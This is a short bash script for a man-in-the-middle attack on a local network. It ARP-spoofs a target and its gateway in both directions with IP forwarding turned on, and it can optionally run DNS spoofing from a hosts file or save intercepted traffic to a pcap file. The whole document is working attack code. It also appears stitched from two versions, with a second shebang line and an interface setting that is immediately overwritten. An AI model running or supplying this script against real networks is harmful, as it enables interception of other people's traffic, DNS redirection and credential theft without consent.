#!/bin/bash


# This script performs ARP spoofing to intercept traffic.

# Dynamically get the active network interface
# Use the `ip route` command to identify the default network interface associated with the default route.
# This ensures the script automatically selects the primary active interface if the user doesn't specify one.
interface=$(ip route | grep default | awk '{print $5}')

#!/bin/bash

interface="eth0"
capture=false
dns_spoof_hosts=""

# Parse command-line arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --interface) interface="$2"; shift ;;
        --target) target="$2"; shift ;;
        --gateway) gateway="$2"; shift ;;
        --capture) capture=true ;;
        --dns-spoof) dns_spoof_hosts="$2"; shift ;;
        *) echo "Unknown parameter: $1"; exit 1 ;;
    esac
    shift
done

# Validate required parameters
if [ -z "$target" ] || [ -z "$gateway" ]; then
    echo "Please specify --target and --gateway"
    exit 1
fi

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# Start ARP spoofing in the background
sudo arpspoof -i "$interface" -t "$target" "$gateway" &
arpspoof_pid1=$!
sudo arpspoof -i "$interface" -t "$gateway" "$target" &
arpspoof_pid2=$!

# Trap to clean up background processes on exit
trap "kill $arpspoof_pid1 $arpspoof_pid2 2>/dev/null; echo 'Cleaned up ARP spoofing processes'" EXIT

# Start DNS spoofing if hosts file is specified
if [ -n "$dns_spoof_hosts" ]; then
    echo "Starting DNS spoofing with hosts file: $dns_spoof_hosts"
    sudo dnsspoof -i "$interface" -f "$dns_spoof_hosts"
elif [ "$capture" = true ]; then
    echo "Capturing traffic to capture.pcap"
    sudo tcpdump -i "$interface" -w capture.pcap
else
    echo "Press Ctrl+C to stop ARP spoofing"
    while true; do sleep 1; done
fi
